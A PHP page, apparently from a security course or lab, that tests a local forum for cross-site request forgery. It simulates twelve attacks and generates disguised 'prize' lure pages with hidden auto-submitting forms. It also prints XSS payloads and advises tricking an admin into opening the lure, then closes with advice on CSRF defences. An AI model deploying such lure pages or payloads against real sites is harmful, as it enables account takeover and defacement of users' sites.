<?php
session_start();
require_once 'config/database.php';
require_once 'includes/functions.php';

// Inisialisasi hasil testing
$results = [];
$test_number = 1;

// Function untuk test CSRF
function testCSRF($description, $target, $method, $params, $context = 'standard')
{
    global $results, $test_number;

    $result = [
        'test_id' => $test_number++,
        'description' => $description,
        'target' => $target,
        'method' => $method,
        'params' => $params,
        'context' => $context,
        'status' => 'UNKNOWN',
        'details' => '',
        'response' => '',
        'vulnerability_confirmed' => false,
        'csrf_protection' => false,
        'risk_level' => 'LOW'
    ];

    try {
        // Simulate the CSRF attack based on target
        if ($target === 'user_management') {
            $response = testUserManagementCSRF($method, $params);
        } elseif ($target === 'post_management') {
            $response = testPostManagementCSRF($method, $params);
        } elseif ($target === 'admin_actions') {
            $response = testAdminActionsCSRF($method, $params);
        } elseif ($target === 'profile_update') {
            $response = testProfileUpdateCSRF($method, $params);
        } elseif ($target === 'password_change') {
            $response = testPasswordChangeCSRF($method, $params);
        } elseif ($target === 'comment_submission') {
            $response = testCommentSubmissionCSRF($method, $params);
        }

        $result['response'] = $response['output'];
        $result['status'] = $response['status'];
        $result['details'] = $response['details'];
        $result['vulnerability_confirmed'] = $response['vulnerable'];
        $result['csrf_protection'] = $response['csrf_protected'];
        $result['risk_level'] = $response['risk_level'];
    } catch (Exception $e) {
        $result['status'] = 'ERROR';
        $result['details'] = $e->getMessage();
        $result['response'] = 'Exception occurred: ' . $e->getMessage();
    }

    $results[] = $result;
    return $result;
}

// Test User Management CSRF
function testUserManagementCSRF($method, $params)
{
    try {
        $action = $params['action'] ?? 'unknown';
        $user_id = $params['user_id'] ?? '';

        $vulnerable = true; // Forum has no CSRF protection
        $csrf_protected = false;
        $details = '';
        $output = '';
        $risk_level = 'MEDIUM';

        // Simulate admin user management actions
        switch ($action) {
            case 'delete_user':
                $output = "User ID $user_id would be deleted";
                $details = "No CSRF token validation - action would execute";
                $risk_level = 'HIGH';
                break;

            case 'promote_user':
                $output = "User ID $user_id would be promoted to admin";
                $details = "Privilege escalation without CSRF protection";
                $risk_level = 'CRITICAL';
                break;

            case 'ban_user':
                $output = "User ID $user_id would be banned";
                $details = "User banning without verification";
                $risk_level = 'HIGH';
                break;

            default:
                $output = "Unknown action attempted";
                $details = "Action would be processed without CSRF validation";
        }

        return [
            'status' => $vulnerable ? 'VULNERABLE' : 'PROTECTED',
            'output' => $output,
            'details' => $details,
            'vulnerable' => $vulnerable,
            'csrf_protected' => $csrf_protected,
            'risk_level' => $risk_level
        ];
    } catch (Exception $e) {
        return [
            'status' => 'ERROR',
            'output' => $e->getMessage(),
            'details' => 'User management test error',
            'vulnerable' => false,
            'csrf_protected' => false,
            'risk_level' => 'UNKNOWN'
        ];
    }
}

// Test Post Management CSRF
function testPostManagementCSRF($method, $params)
{
    try {
        $action = $params['action'] ?? 'create';
        $title = $params['title'] ?? 'CSRF Test Post';
        $content = $params['content'] ?? 'Content created via CSRF';

        $vulnerable = true;
        $csrf_protected = false;
        $details = "No CSRF token in post forms";
        $output = '';
        $risk_level = 'MEDIUM';

        switch ($action) {
            case 'create':
                $output = "Post would be created: '$title'";
                $details = "Mass post creation possible via CSRF";
                if (stripos($content, '<script') !== false) {
                    $details .= " + XSS payload included";
                    $risk_level = 'HIGH';
                }
                break;

            case 'delete':
                $post_id = $params['post_id'] ?? '';
                $output = "Post ID $post_id would be deleted";
                $details = "Post deletion without confirmation";
                $risk_level = 'HIGH';
                break;

            case 'edit':
                $post_id = $params['post_id'] ?? '';
                $output = "Post ID $post_id would be modified";
                $details = "Content modification without verification";
                $risk_level = 'HIGH';
                break;
        }

        return [
            'status' => 'VULNERABLE',
            'output' => $output,
            'details' => $details,
            'vulnerable' => $vulnerable,
            'csrf_protected' => $csrf_protected,
            'risk_level' => $risk_level
        ];
    } catch (Exception $e) {
        return [
            'status' => 'ERROR',
            'output' => $e->getMessage(),
            'details' => 'Post management test error',
            'vulnerable' => false,
            'csrf_protected' => false,
            'risk_level' => 'UNKNOWN'
        ];
    }
}

// Test Admin Actions CSRF
function testAdminActionsCSRF($method, $params)
{
    try {
        $action = $params['action'] ?? 'unknown';

        $vulnerable = true;
        $csrf_protected = false;
        $risk_level = 'CRITICAL';

        switch ($action) {
            case 'system_settings':
                $output = "System settings would be modified";
                $details = "Critical system configuration vulnerable to CSRF";
                break;

            case 'create_admin':
                $username = $params['username'] ?? 'csrf_admin';
                $output = "New admin user '$username' would be created";
                $details = "Admin account creation without CSRF protection";
                break;

            case 'database_action':
                $output = "Database operation would execute";
                $details = "Direct database manipulation via CSRF";
                break;

            case 'file_upload':
                $output = "File upload would be processed";
                $details = "Malicious file upload via CSRF";
                break;

            default:
                $output = "Admin action would execute";
                $details = "High-privilege action without validation";
        }

        return [
            'status' => 'VULNERABLE',
            'output' => $output,
            'details' => $details,
            'vulnerable' => $vulnerable,
            'csrf_protected' => $csrf_protected,
            'risk_level' => $risk_level
        ];
    } catch (Exception $e) {
        return [
            'status' => 'ERROR',
            'output' => $e->getMessage(),
            'details' => 'Admin actions test error',
            'vulnerable' => false,
            'csrf_protected' => false,
            'risk_level' => 'UNKNOWN'
        ];
    }
}

// Test Profile Update CSRF
function testProfileUpdateCSRF($method, $params)
{
    try {
        $field = $params['field'] ?? 'email';
        $value = $params['value'] ?? 'attacker@evil.com';

        $vulnerable = true;
        $csrf_protected = false;
        $risk_level = 'HIGH';

        $output = "Profile field '$field' would be updated to '$value'";
        $details = "User profile modification without consent";

        // Check for email change (critical)
        if ($field === 'email') {
            $details = "Email change without verification - account takeover risk";
            $risk_level = 'CRITICAL';
        }

        return [
            'status' => 'VULNERABLE',
            'output' => $output,
            'details' => $details,
            'vulnerable' => $vulnerable,
            'csrf_protected' => $csrf_protected,
            'risk_level' => $risk_level
        ];
    } catch (Exception $e) {
        return [
            'status' => 'ERROR',
            'output' => $e->getMessage(),
            'details' => 'Profile update test error',
            'vulnerable' => false,
            'csrf_protected' => false,
            'risk_level' => 'UNKNOWN'
        ];
    }
}

// Test Password Change CSRF
function testPasswordChangeCSRF($method, $params)
{
    try {
        $new_password = $params['new_password'] ?? 'hacked123';

        $vulnerable = true;
        $csrf_protected = false;
        $risk_level = 'CRITICAL';

        $output = "Password would be changed to '$new_password'";
        $details = "Password change without current password verification or CSRF token";

        return [
            'status' => 'VULNERABLE',
            'output' => $output,
            'details' => $details,
            'vulnerable' => $vulnerable,
            'csrf_protected' => $csrf_protected,
            'risk_level' => $risk_level
        ];
    } catch (Exception $e) {
        return [
            'status' => 'ERROR',
            'output' => $e->getMessage(),
            'details' => 'Password change test error',
            'vulnerable' => false,
            'csrf_protected' => false,
            'risk_level' => 'UNKNOWN'
        ];
    }
}

// Test Comment Submission CSRF
function testCommentSubmissionCSRF($method, $params)
{
    try {
        $content = $params['content'] ?? '<script>alert("CSRF XSS")</script>';
        $post_id = $params['post_id'] ?? '1';

        $vulnerable = true;
        $csrf_protected = false;
        $risk_level = 'MEDIUM';

        $output = "Comment would be posted on post ID $post_id";
        $details = "Comment spam possible via CSRF";

        // Check for XSS in comment
        if (stripos($content, '<script') !== false || stripos($content, 'javascript:') !== false) {
            $details = "CSRF + XSS combination - stored malicious script";
            $risk_level = 'HIGH';
        }

        return [
            'status' => 'VULNERABLE',
            'output' => $output,
            'details' => $details,
            'vulnerable' => $vulnerable,
            'csrf_protected' => $csrf_protected,
            'risk_level' => $risk_level
        ];
    } catch (Exception $e) {
        return [
            'status' => 'ERROR',
            'output' => $e->getMessage(),
            'details' => 'Comment submission test error',
            'vulnerable' => false,
            'csrf_protected' => false,
            'risk_level' => 'UNKNOWN'
        ];
    }
}

// Generate CSRF attack HTML
function generateCSRFAttackHTML($target, $method, $params, $description)
{
    $action_url = "http://localhost/Musywar/" . $target;
    $auto_submit = isset($params['auto_submit']) ? $params['auto_submit'] : true;

    $html = "<!-- CSRF Attack: $description -->\n";
    $html .= "<!DOCTYPE html>\n<html>\n<head>\n";
    $html .= "<title>Innocent Looking Page</title>\n</head>\n<body>\n";
    $html .= "<h1>🎁 Congratulations! You won a prize!</h1>\n";
    $html .= "<p>Click the button below to claim your reward:</p>\n\n";

    if ($method === 'GET') {
        $html .= "<img src=\"$action_url";
        $query_params = [];
        foreach ($params as $key => $value) {
            if ($key !== 'auto_submit') {
                $query_params[] = urlencode($key) . "=" . urlencode($value);
            }
        }
        if (!empty($query_params)) {
            $html .= "?" . implode("&", $query_params);
        }
        $html .= "\" style=\"display:none;\" />\n";
    } else {
        $html .= "<form id=\"csrf-form\" action=\"$action_url\" method=\"$method\">\n";
        foreach ($params as $key => $value) {
            if ($key !== 'auto_submit') {
                $html .= "    <input type=\"hidden\" name=\"" . htmlspecialchars($key) . "\" value=\"" . htmlspecialchars($value) . "\" />\n";
            }
        }
        $html .= "    <button type=\"submit\">Claim Prize!</button>\n";
        $html .= "</form>\n";

        if ($auto_submit) {
            $html .= "\n<script>\n";
            $html .= "// Auto-submit after 2 seconds\n";
            $html .= "setTimeout(function() {\n";
            $html .= "    document.getElementById('csrf-form').submit();\n";
            $html .= "}, 2000);\n";
            $html .= "</script>\n";
        }
    }

    $html .= "</body>\n</html>";
    return $html;
}

// Mulai testing jika form disubmit
if ($_POST['run_tests'] ?? false) {

    // ===== USER MANAGEMENT CSRF =====
    echo "<h2>👥 USER MANAGEMENT CSRF TESTS</h2>";

    // Test 1: Delete user
    testCSRF(
        "Delete User via CSRF",
        "user_management",
        "POST",
        ['action' => 'delete_user', 'user_id' => '3']
    );

    // Test 2: Promote user to admin
    testCSRF(
        "Promote User to Admin",
        "user_management",
        "POST",
        ['action' => 'promote_user', 'user_id' => '5', 'role' => 'admin']
    );

    // Test 3: Ban user
    testCSRF(
        "Ban User Account",
        "user_management",
        "POST",
        ['action' => 'ban_user', 'user_id' => '4', 'reason' => 'CSRF Attack']
    );

    // ===== POST MANAGEMENT CSRF =====
    echo "<h2>📝 POST MANAGEMENT CSRF TESTS</h2>";

    // Test 4: Create spam post
    testCSRF(
        "Mass Post Creation",
        "post_management",
        "POST",
        ['action' => 'create', 'title' => 'CSRF Spam Post', 'content' => 'This post was created via CSRF attack', 'category' => '1']
    );

    // Test 5: Create XSS post via CSRF
    testCSRF(
        "CSRF + XSS Post Creation",
        "post_management",
        "POST",
        ['action' => 'create', 'title' => 'Malicious Post', 'content' => '<script>alert("CSRF + XSS")</script>', 'category' => '1']
    );

    // Test 6: Delete post
    testCSRF(
        "Delete Post via CSRF",
        "post_management",
        "POST",
        ['action' => 'delete', 'post_id' => '2']
    );

    // ===== ADMIN ACTIONS CSRF =====
    echo "<h2>⚡ ADMIN ACTIONS CSRF TESTS</h2>";

    // Test 7: System settings change
    testCSRF(
        "Modify System Settings",
        "admin_actions",
        "POST",
        ['action' => 'system_settings', 'site_name' => 'Hacked Forum', 'maintenance_mode' => 'on']
    );

    // Test 8: Create new admin
    testCSRF(
        "Create Backdoor Admin",
        "admin_actions",
        "POST",
        ['action' => 'create_admin', 'username' => 'backdoor_admin', 'password' => 'secret123', 'role' => 'admin']
    );

    // ===== PROFILE & SECURITY CSRF =====
    echo "<h2>🔒 PROFILE & SECURITY CSRF TESTS</h2>";

    // Test 9: Email change
    testCSRF(
        "Change User Email",
        "profile_update",
        "POST",
        ['field' => 'email', 'value' => 'attacker@malicious.com']
    );

    // Test 10: Password change
    testCSRF(
        "Change User Password",
        "password_change",
        "POST",
        ['new_password' => 'compromised123', 'confirm_password' => 'compromised123']
    );

    // ===== CONTENT CSRF =====
    echo "<h2>💬 CONTENT CSRF TESTS</h2>";

    // Test 11: Comment spam
    testCSRF(
        "Comment Spam via CSRF",
        "comment_submission",
        "POST",
        ['content' => 'SPAM COMMENT POSTED VIA CSRF', 'post_id' => '1']
    );

    // Test 12: XSS comment via CSRF
    testCSRF(
        "CSRF + XSS Comment",
        "comment_submission",
        "POST",
        ['content' => '<img src=x onerror="alert(\'CSRF XSS in Comment\')">', 'post_id' => '1']
    );
}
?>

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CSRF Comprehensive Testing</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
    <style>
        .test-vulnerable {
            background-color: #f8d7da;
            border-left: 5px solid #dc3545;
        }

        .test-protected {
            background-color: #d1e7dd;
            border-left: 5px solid #198754;
        }

        .test-error {
            background-color: #fff3cd;
            border-left: 5px solid #ffc107;
        }

        .payload-code {
            background-color: #f8f9fa;
            padding: 10px;
            border-radius: 5px;
            font-family: monospace;
            font-size: 0.9em;
        }

        .result-details {
            font-size: 0.9em;
            color: #666;
        }

        .vulnerability-badge {
            font-size: 0.8em;
        }

        .risk-critical {
            background-color: #dc3545 !important;
        }

        .risk-high {
            background-color: #fd7e14 !important;
        }

        .risk-medium {
            background-color: #ffc107 !important;
            color: #000;
        }

        .risk-low {
            background-color: #28a745 !important;
        }

        .csrf-html {
            background-color: #f8f9fa;
            border: 1px solid #dee2e6;
            padding: 15px;
            border-radius: 5px;
        }
    </style>
</head>

<body>
    <div class="container-fluid mt-4">
        <div class="row">
            <div class="col-12">
                <div class="card">
                    <div class="card-header bg-info text-white">
                        <h2><i class="fas fa-user-secret"></i> 🎭 CSRF COMPREHENSIVE TESTING</h2>
                        <p class="mb-0">Testing Cross-Site Request Forgery vulnerabilities pada Forum System</p>
                    </div>

                    <div class="card-body">
                        <?php if (!isset($_POST['run_tests'])): ?>
                            <!-- Form untuk memulai testing -->
                            <div class="alert alert-warning">
                                <h5><i class="fas fa-mask"></i> CSRF Testing Overview</h5>
                                <p>CSRF (Cross-Site Request Forgery) attack memungkinkan attacker untuk:</p>
                                <ul>
                                    <li><strong>Execute actions</strong> atas nama user yang authenticated</li>
                                    <li><strong>Modify user data</strong> tanpa sepengetahuan mereka</li>
                                    <li><strong>Perform admin operations</strong> jika target adalah admin</li>
                                    <li><strong>Change security settings</strong> seperti password dan email</li>
                                    <li><strong>Create/Delete content</strong> menggunakan user's privilege</li>
                                </ul>
                                <p><strong>📋 Testing akan generate contoh HTML attack files!</strong></p>
                            </div>

                            <div class="row">
                                <div class="col-md-6">
                                    <h5>Attack Vectors Tested:</h5>
                                    <ul>
                                        <li><span class="badge bg-danger">User Management</span> - Delete, promote, ban users</li>
                                        <li><span class="badge bg-warning text-dark">Content Management</span> - Create, edit, delete posts</li>
                                        <li><span class="badge bg-info">Admin Operations</span> - System settings, new admins</li>
                                        <li><span class="badge bg-secondary">Profile Changes</span> - Email, password changes</li>
                                    </ul>
                                </div>
                                <div class="col-md-6">
                                    <h5>Attack Methods:</h5>
                                    <ul>
                                        <li>Form-based POST requests</li>
                                        <li>Image src GET requests</li>
                                        <li>Auto-submitting forms</li>
                                        <li>JavaScript-triggered requests</li>
                                        <li>Hidden iframe attacks</li>
                                    </ul>
                                </div>
                            </div>

                            <div class="alert alert-info mt-3">
                                <h6><i class="fas fa-info-circle"></i> Expected Results:</h6>
                                <p>Karena forum ini <strong>tidak memiliki CSRF protection</strong>, semua test akan menunjukkan kerentanan.
                                    Testing ini akan generate HTML files yang dapat digunakan untuk demonstrasi serangan.</p>
                            </div>

                            <form method="POST" class="mt-4">
                                <button type="submit" name="run_tests" value="1" class="btn btn-info btn-lg">
                                    <i class="fas fa-shield-alt"></i> Mulai CSRF Testing
                                </button>
                            </form>

                        <?php else: ?>
                            <!-- Hasil Testing -->
                            <div class="alert alert-primary mb-4">
                                <h5><i class="fas fa-chart-bar"></i> CSRF Testing Results</h5>
                                <div class="row">
                                    <div class="col-md-3">
                                        <strong>Total Tests:</strong> <?php echo count($results); ?>
                                    </div>
                                    <div class="col-md-3">
                                        <strong>Vulnerable:</strong>
                                        <span class="badge bg-danger"><?php echo count(array_filter($results, function ($r) {
                                                                            return $r['vulnerability_confirmed'];
                                                                        })); ?></span>
                                    </div>
                                    <div class="col-md-3">
                                        <strong>Critical Risk:</strong>
                                        <span class="badge bg-dark"><?php echo count(array_filter($results, function ($r) {
                                                                        return $r['risk_level'] === 'CRITICAL';
                                                                    })); ?></span>
                                    </div>
                                    <div class="col-md-3">
                                        <strong>Protected:</strong>
                                        <span class="badge bg-success"><?php echo count(array_filter($results, function ($r) {
                                                                            return $r['csrf_protection'];
                                                                        })); ?></span>
                                    </div>
                                </div>
                            </div>

                            <!-- Detail hasil setiap test -->
                            <div class="row">
                                <?php foreach ($results as $result): ?>
                                    <div class="col-12 mb-3">
                                        <div class="card <?php
                                                            echo $result['vulnerability_confirmed'] ? 'test-vulnerable' : ($result['status'] === 'ERROR' ? 'test-error' : 'test-protected');
                                                            ?>">
                                            <div class="card-header">
                                                <div class="d-flex justify-content-between align-items-center">
                                                    <h6 class="mb-0">
                                                        <i class="fas fa-user-secret"></i>
                                                        Test #<?php echo $result['test_id']; ?>: <?php echo htmlspecialchars($result['description']); ?>
                                                    </h6>
                                                    <div>
                                                        <!-- Risk level badge -->
                                                        <span class="badge vulnerability-badge <?php
                                                                                                switch ($result['risk_level']) {
                                                                                                    case 'CRITICAL':
                                                                                                        echo 'risk-critical';
                                                                                                        break;
                                                                                                    case 'HIGH':
                                                                                                        echo 'risk-high';
                                                                                                        break;
                                                                                                    case 'MEDIUM':
                                                                                                        echo 'risk-medium';
                                                                                                        break;
                                                                                                    case 'LOW':
                                                                                                        echo 'risk-low';
                                                                                                        break;
                                                                                                    default:
                                                                                                        echo 'bg-secondary';
                                                                                                }
                                                                                                ?>">
                                                            <?php echo $result['risk_level']; ?> RISK
                                                        </span>

                                                        <!-- Vulnerability status -->
                                                        <span class="badge vulnerability-badge <?php
                                                                                                echo $result['vulnerability_confirmed'] ? 'bg-danger' : ($result['csrf_protection'] ? 'bg-success' : 'bg-warning text-dark');
                                                                                                ?>">
                                                            <?php
                                                            if ($result['csrf_protection']) echo 'PROTECTED';
                                                            elseif ($result['vulnerability_confirmed']) echo 'VULNERABLE';
                                                            else echo $result['status'];
                                                            ?>
                                                        </span>
                                                    </div>
                                                </div>
                                            </div>

                                            <div class="card-body">
                                                <div class="row">
                                                    <div class="col-md-6">
                                                        <strong>Target:</strong> <?php echo htmlspecialchars($result['target']); ?><br>
                                                        <strong>Method:</strong> <?php echo htmlspecialchars($result['method']); ?><br>
                                                        <strong>CSRF Protection:</strong>
                                                        <span class="badge <?php echo $result['csrf_protection'] ? 'bg-success' : 'bg-danger'; ?>">
                                                            <?php echo $result['csrf_protection'] ? 'YES' : 'NO'; ?>
                                                        </span>
                                                    </div>
                                                    <div class="col-md-6">
                                                        <strong>Parameters:</strong>
                                                        <div class="payload-code mt-1">
                                                            <?php
                                                            if (is_array($result['params'])) {
                                                                foreach ($result['params'] as $key => $value) {
                                                                    echo htmlspecialchars($key) . ": " . htmlspecialchars($value) . "\n";
                                                                }
                                                            } else {
                                                                echo htmlspecialchars($result['params']);
                                                            }
                                                            ?>
                                                        </div>
                                                    </div>
                                                </div>

                                                <hr>

                                                <div class="row">
                                                    <div class="col-12">
                                                        <strong>Attack Simulation Result:</strong>
                                                        <div class="mt-2 p-2 bg-light border-start border-3">
                                                            <?php echo htmlspecialchars($result['response']); ?>
                                                        </div>

                                                        <?php if (!empty($result['details'])): ?>
                                                            <div class="result-details mt-2">
                                                                <strong>Technical Analysis:</strong> <?php echo htmlspecialchars($result['details']); ?>
                                                            </div>
                                                        <?php endif; ?>

                                                        <!-- Show CSRF attack HTML if vulnerable -->
                                                        <?php if ($result['vulnerability_confirmed']): ?>
                                                            <div class="mt-3">
                                                                <strong><i class="fas fa-code"></i> CSRF Attack HTML:</strong>
                                                                <div class="csrf-html mt-2">
                                                                    <pre><code><?php
                                                                                $attack_html = generateCSRFAttackHTML(
                                                                                    $result['target'] . '.php',
                                                                                    $result['method'],
                                                                                    $result['params'],
                                                                                    $result['description']
                                                                                );
                                                                                echo htmlspecialchars($attack_html);
                                                                                ?></code></pre>
                                                                </div>
                                                                <div class="text-muted mt-2">
                                                                    <small>
                                                                        <i class="fas fa-info-circle"></i>
                                                                        Save this HTML to a file and trick an authenticated admin to open it.
                                                                    </small>
                                                                </div>
                                                            </div>
                                                        <?php endif; ?>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                <?php endforeach; ?>
                            </div>

                            <!-- Summary dan rekomendasi -->
                            <div class="alert alert-dark mt-4">
                                <h5><i class="fas fa-shield-alt"></i> CSRF Security Assessment</h5>

                                <?php
                                $vulnerable_count = count(array_filter($results, function ($r) {
                                    return $r['vulnerability_confirmed'];
                                }));
                                $critical_count = count(array_filter($results, function ($r) {
                                    return $r['risk_level'] === 'CRITICAL';
                                }));
                                $total_tests = count($results);
                                ?>

                                <?php if ($vulnerable_count > 0): ?>
                                    <div class="alert alert-danger">
                                        <strong>🚨 MASSIVE CSRF VULNERABILITIES!</strong><br>
                                        <?php echo $vulnerable_count; ?> dari <?php echo $total_tests; ?> tests vulnerable, termasuk <?php echo $critical_count; ?> critical risks.

                                        <h6 class="mt-3">Critical Attack Scenarios:</h6>
                                        <ul>
                                            <li><strong>Admin Account Takeover:</strong> Create backdoor admin accounts</li>
                                            <li><strong>Mass User Management:</strong> Delete/ban legitimate users</li>
                                            <li><strong>Content Manipulation:</strong> Mass spam posting with XSS</li>
                                            <li><strong>System Configuration:</strong> Change critical settings</li>
                                            <li><strong>Data Theft:</strong> Modify user emails for password reset attacks</li>
                                        </ul>
                                    </div>
                                <?php else: ?>
                                    <div class="alert alert-success">
                                        <strong>✅ CSRF PROTECTION ACTIVE</strong><br>
                                        System memiliki proteksi CSRF yang memadai.
                                    </div>
                                <?php endif; ?>

                                <h6>Immediate CSRF Protection Implementation:</h6>
                                <div class="row">
                                    <div class="col-md-6">
                                        <ul>
                                            <li><strong>CSRF Tokens:</strong> Generate dan validate unique tokens</li>
                                            <li><strong>SameSite Cookies:</strong> Set cookie SameSite attribute</li>
                                            <li><strong>Referer Validation:</strong> Check request origin</li>
                                            <li><strong>Double Submit:</strong> Cookie + form token validation</li>
                                        </ul>
                                    </div>
                                    <div class="col-md-6">
                                        <ul>
                                            <li><strong>Custom Headers:</strong> Require X-Requested-With header</li>
                                            <li><strong>Re-authentication:</strong> Require password for critical actions</li>
                                            <li><strong>CAPTCHA:</strong> For sensitive operations</li>
                                            <li><strong>Rate Limiting:</strong> Prevent automated attacks</li>
                                        </ul>
                                    </div>
                                </div>

                                <h6>Code Implementation Example:</h6>
                                <div class="csrf-html">
                                    <pre><code>// Generate CSRF token
$_SESSION['csrf_token'] = bin2hex(random_bytes(32));

// In forms
&lt;input type="hidden" name="csrf_token" value="&lt;?= $_SESSION['csrf_token'] ?&gt;"&gt;

// Validate token
if (!hash_equals($_SESSION['csrf_token'], $_POST['csrf_token'])) {
    die('CSRF token validation failed');
}</code></pre>
                                </div>
                            </div>

                            <div class="text-center mt-4">
                                <a href="test_csrf_comprehensive.php" class="btn btn-secondary">
                                    <i class="fas fa-redo"></i> Test Ulang
                                </a>
                                <a href="test_all_vulnerabilities.php" class="btn btn-success">
                                    <i class="fas fa-check-circle"></i> Complete Security Assessment
                                </a>
                            </div>
                        <?php endif; ?>
                    </div>
                </div>
            </div>
        </div>
    </div>
</body>

</html>